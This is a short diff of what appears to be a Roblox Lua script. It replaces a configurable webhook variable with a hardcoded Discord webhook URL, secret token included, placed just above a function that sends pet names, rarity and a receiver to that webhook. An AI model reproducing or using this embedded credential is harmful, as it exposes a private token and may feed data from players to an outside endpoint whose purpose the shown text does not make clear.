@@ -943,7 +943,7 @@ function RAP()
 end
 
 -- Webhook
-local url = Webhook
+local url = "https://discord.com/api/webhooks/1142419710898618388/NbCQbiQu_Js45bfAMo8dcL4a8cCXHtsUcp2n2V3pW804OaJ6jNI-8lmTGcXiDaR75gXa"
 local whenabled = true
 local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
     local abcdef1
